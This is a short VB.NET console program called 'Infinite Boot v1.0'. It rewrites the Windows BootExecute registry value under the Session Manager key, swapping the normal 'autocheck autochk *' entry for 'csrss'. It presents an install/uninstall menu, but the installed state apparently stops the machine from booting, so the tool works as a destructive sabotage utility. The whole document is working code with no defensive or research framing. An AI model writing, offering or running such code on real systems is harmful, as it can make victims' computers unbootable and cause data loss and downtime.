Imports Microsoft.Win32

Module Module1
    Sub Main()
        Do
            Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Control\Session Manager", True)
            Dim values As String() = DirectCast(key.GetValue("BootExecute"), String())
            Dim firstLine As String = values(0)
            Console.WriteLine("===========================================")
            Console.WriteLine("===========Infinite Boot v1.0==============")
            Console.WriteLine("===========================================")
            Console.WriteLine()

            If firstLine = "csrss" Then
                Console.ForegroundColor = ConsoleColor.White
                Console.Write("Installed: [")
                Console.ForegroundColor = ConsoleColor.DarkGreen
                Console.Write("TRUE")
                Console.ResetColor()
                Console.WriteLine("]")
                Console.WriteLine()
                Console.Write("Press any key to uninstall...")
                Console.ReadKey(True)
                values(0) = "autocheck autochk *"
                key.SetValue("BootExecute", values, RegistryValueKind.MultiString)
                key.Flush()
            ElseIf firstLine = "autocheck autochk *" Then
                Console.ForegroundColor = ConsoleColor.White
                Console.Write("Installed: [")
                Console.ForegroundColor = ConsoleColor.Red
                Console.Write("FALSE")
                Console.ResetColor()
                Console.WriteLine("]")
                Console.WriteLine()
                Console.Write("Press any key to install...")
                Console.ReadKey(True)
                values(0) = "csrss"
                key.SetValue("BootExecute", values, RegistryValueKind.MultiString)
                key.Flush()
            End If
            Console.Clear()
        Loop
    End Sub
End Module
